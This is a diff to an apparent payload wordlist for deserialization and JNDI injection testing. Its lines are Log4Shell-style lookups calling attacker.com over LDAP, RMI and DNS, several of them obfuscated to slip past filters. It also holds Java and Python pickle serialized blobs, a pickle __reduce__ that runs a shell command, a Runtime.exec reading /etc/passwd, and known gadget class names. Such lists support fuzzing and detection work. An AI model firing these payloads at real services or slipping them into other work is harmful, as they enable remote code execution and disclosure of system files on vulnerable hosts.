@@ -1,16 +1,33 @@
-rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==
-${jndi:ldap://attacker.com/x}
-${jndi:rmi://attacker.com:1099/x}
+${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com}
+${${::-j}ndi:rmi://attacker.com}
+${${lower:${lower:jndi}}:${::-l}${::-d}${::-a}${::-p}://attacker.com}
+${${lower:jndi}:${lower:ldap}://attacker.com}
 ${${lower:j}ndi:${lower:l}dap://attacker.com}
 ${::-j}ndi:rmi://attacker.com
-x=${jndi:dns://x.attacker.com}
-O:8:"stdClass":0:{}
+${jndi:${lower:ldap}://attacker.com}
+${jndi:dns://attacker.com}
+${jndi:ldap://attacker.com/a}
+${jndi:ldap://attacker.com/x}
+${jndi:rmi://attacker.com:1099/x}
+N;
 O:32:"Monolog_Handler_SyslogHandler":0:{}
-gASVYAAAAAAAAACAAAAAAAAAAIwCAAAAAmVjaG8gZXZpbA==
-def __reduce__(self): return os.system, ('id',)
+O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"pass";s:5:"admin";}
+O:8:"stdClass":0:{}
+O:8:"stdClass":1:{s:4:"test";s:4:"test";}
 Runtime.getRuntime().exec("cat /etc/passwd")
-org.apache.commons.collections.functors.InvokerTransformer
+a:1:{s:4:"test";s:4:"test";}
+a:1:{s:6:"length";i:10;}
+a:2:{i:0;s:4:"test";i:1;s:4:"test";}
+b:1;
 com.sun.rowset.JdbcRowSetImpl
+def __reduce__(self): return os.system, ('id',)
+gASVYAAAAAAAAACAAAAAAAAAAIwCAAAAAmVjaG8gZXZpbA==
+i:1;
+org.apache.commons.collections.functors.InvokerTransformer
 org.apache.naming.factory.BeanFactory
 org.apache.xalan.internal.xsltc.trax.TemplatesImpl
+rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==
+rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUHAAAECAAAABAHBAIABAQ
+s:4:"test";
+x=${jndi:dns://x.attacker.com}
 ysoserial.CommonsCollections1
